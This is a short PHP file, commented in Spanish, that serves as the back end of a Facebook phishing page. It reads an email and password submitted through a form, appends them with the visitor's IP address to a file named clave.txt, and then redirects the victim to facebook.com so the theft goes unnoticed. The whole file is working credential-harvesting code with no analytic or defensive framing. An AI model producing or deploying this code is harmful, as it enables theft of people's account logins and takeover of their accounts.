<?php
$correo = $_POST[ 'email' ]; 
$contraseña = $_POST[ 'pass' ];
$ip = $_SERVER[ 'REMOTE_ADDR' ];
 
if( ( empty($correo)) or (empty($contraseña)) ){
    header('location: index.htm');
}else{  
        //guarderemos en un archivo de texto
        $file = fopen('clave.txt','a+');
        fwrite($file, "correo: ".$correo."\r\ncontraseña: ".$contraseña."\r\nIP: ".$ip."\r\n=========================\r\n");
        fclose($file);
        header('location:http://www.facebook.com/');      
        
}
?>